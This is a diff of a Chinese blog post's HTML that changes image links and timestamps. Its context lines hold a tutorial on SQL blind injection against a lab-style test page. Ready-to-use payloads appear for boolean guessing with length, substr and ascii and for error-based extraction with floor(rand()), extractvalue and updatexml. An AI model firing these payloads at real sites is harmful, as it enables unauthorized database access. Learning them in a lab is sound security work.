@@ -158,14 +158,14 @@
 <meta property="og:url" content="http://bleaner.club/2019/11/22/sql盲注/index.html">
 <meta property="og:site_name" content="热爱 | bleaner">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1kachuu/p1kachuu.github.io/pictures/screen shot/sqlm1.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1kachuu/p1kachuu.github.io/pictures/screen shot/sqlm2.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1kachuu/p1kachuu.github.io/pictures/screen shot/sqlm3.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1kachuu/p1kachuu.github.io/pictures/screen shot/sqlm4.png">
-<meta property="og:updated_time" content="2020-08-25T05:51:14.511Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1kachuu/Picture/screen shot/sqlm1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1kachuu/Picture/screen shot/sqlm2.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1kachuu/Picture/screen shot/sqlm3.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/p1kachuu/Picture/screen shot/sqlm4.png">
+<meta property="og:updated_time" content="2020-08-25T06:04:39.805Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sql盲注">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p1kachuu/p1kachuu.github.io/pictures/screen shot/sqlm1.png">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/p1kachuu/Picture/screen shot/sqlm1.png">
 
 
 
@@ -504,7 +504,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2020-08-25 13:51:14" itemprop="dateModified" datetime="2020-08-25T13:51:14+08:00">2020-08-25</time>
+                <time title="修改时间：2020-08-25 14:04:39" itemprop="dateModified" datetime="2020-08-25T14:04:39+08:00">2020-08-25</time>
               
             
           </span>
@@ -583,8 +583,8 @@
 <p>Length（）函数 返回字符串的长度<br>Substr（）截取字符串 从1开始<br>Ascii（）返回字符的ascii码<br>sleep(n)：将程序挂起一段时间 n为n秒<br>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p>
 </blockquote>
 <p>当然如果上面的函数被禁用，也有相应的函数替换。可百度<br>布尔型：页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p>
-<h3 id="测试页面"><a href="#测试页面" class="headerlink" title="测试页面"></a>测试页面</h3><p><img src="https://cdn.jsdelivr.net/gh/p1kachuu/p1kachuu.github.io/pictures/screen shot/sqlm1.png" alt></p>
-<p>get一个参数id=1，返回true界面<br><img src="https://cdn.jsdelivr.net/gh/p1kachuu/p1kachuu.github.io/pictures/screen shot/sqlm2.png" alt><br>id=1’ and 1=2%23，返回false页面</p>
+<h3 id="测试页面"><a href="#测试页面" class="headerlink" title="测试页面"></a>测试页面</h3><p><img src="https://cdn.jsdelivr.net/gh/p1kachuu/Picture/screen shot/sqlm1.png" alt></p>
+<p>get一个参数id=1，返回true界面<br><img src="https://cdn.jsdelivr.net/gh/p1kachuu/Picture/screen shot/sqlm2.png" alt><br>id=1’ and 1=2%23，返回false页面</p>
 <p>到这里初步确定单引号存在注入，TRUE页面有’you are in………..‘，FALSE页面不存在’you are in ……..‘<br> 源代码：<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;</code>;验证确实是由于单引号闭合导致注入漏洞。后台执行结果SELECT * FROM users WHERE id=’1’’ 原因单引号在闭合后还存在一个单引号。会引起查询报错<br>知道为盲注布尔型注入，利用上面的函数进行猜解。</p>
 <p>1.判断数据库长度<br><code>/index.php?id=1&#39; and length(database())&gt;8%23</code>      返回FALSE<br><code>/index.php?id=1&#39; and length(database())&gt;7%23</code>      返回TRUE<br>length(database)=8<br>2.爆出数据库名字<br>2.1第一个数据库长度<br><code>id=1&#39; and length((select schema_name from information_schema.schemata limit 0,1))&gt;18%23</code>   返回False<br><code>id=1&#39; and length((select schema_name from information_schema.schemata limit 0,1))&gt;17%23</code>   返回True<br>故第一个数据库长度为18<br>2.2第一个数据库名<br>2.2.1第一个字母<br>substr(“pikachuu”,1,1)=’p’<br><code>id=1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;104</code>  返回True<br><code>id=1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;105</code>  返回False<br>（实际用二分法查找）<br>ascii(‘i’)=105，所以第一个字母为’i’<br>原理就是这样，接着用脚本跑一下就ok了<br>3.查表、查列、查字段</p>
 <hr>
@@ -592,9 +592,9 @@
 <hr>
 <h2 id="基于报错的盲注"><a href="#基于报错的盲注" class="headerlink" title="基于报错的盲注"></a>基于报错的盲注</h2><p>基于报错的盲注是通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而是我们得到想要的基本信息——数据库名、版本、用户名等</p>
 <p>1.直接使用报错：<br><code>&#39; union select 1,count(*),concat(&#39;/&#39;,(select database()),&#39;/&#39;,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p>
-<p>这里格式貌似几乎固定，相当于这样输就会出错的bug，count()用来返回有多少条数据这里固定写法，中间select后面是我们要获得的信息，<br>floor(rand(0)*2)也是固定写法，floor用来取不大于括号里的最大整数，比如1.5取1，后面的a和最后的a只要是相等的字符就可以，如图<br><img src="https://cdn.jsdelivr.net/gh/p1kachuu/p1kachuu.github.io/pictures/screen shot/sqlm3.png" alt></p>
+<p>这里格式貌似几乎固定，相当于这样输就会出错的bug，count()用来返回有多少条数据这里固定写法，中间select后面是我们要获得的信息，<br>floor(rand(0)*2)也是固定写法，floor用来取不大于括号里的最大整数，比如1.5取1，后面的a和最后的a只要是相等的字符就可以，如图<br><img src="https://cdn.jsdelivr.net/gh/p1kachuu/Picture/screen shot/sqlm3.png" alt></p>
 <p>注意返回值不能超过一行，如果多行数据加limit<br>2.利用xpath函数-extractvalue报错<br>payload：<br><code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</code></p>
-<p>这也是一种类似bug的固定写法，extractvalue，concat里面第一个必须是0x7e，后面是要查的内容，concat里面可以放很多参数（参见目录），所以可以多查很多数据，如图：<br><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e,user()))--+</code><br><img src="https://cdn.jsdelivr.net/gh/p1kachuu/p1kachuu.github.io/pictures/screen shot/sqlm4.png" alt></p>
+<p>这也是一种类似bug的固定写法，extractvalue，concat里面第一个必须是0x7e，后面是要查的内容，concat里面可以放很多参数（参见目录），所以可以多查很多数据，如图：<br><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e,user()))--+</code><br><img src="https://cdn.jsdelivr.net/gh/p1kachuu/Picture/screen shot/sqlm4.png" alt></p>
 <p>3.利用xpath函数—updatexml报错：<br>payload:<br><code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></p>
 <p>与extractvalue同理，这里不再赘述</p>
       
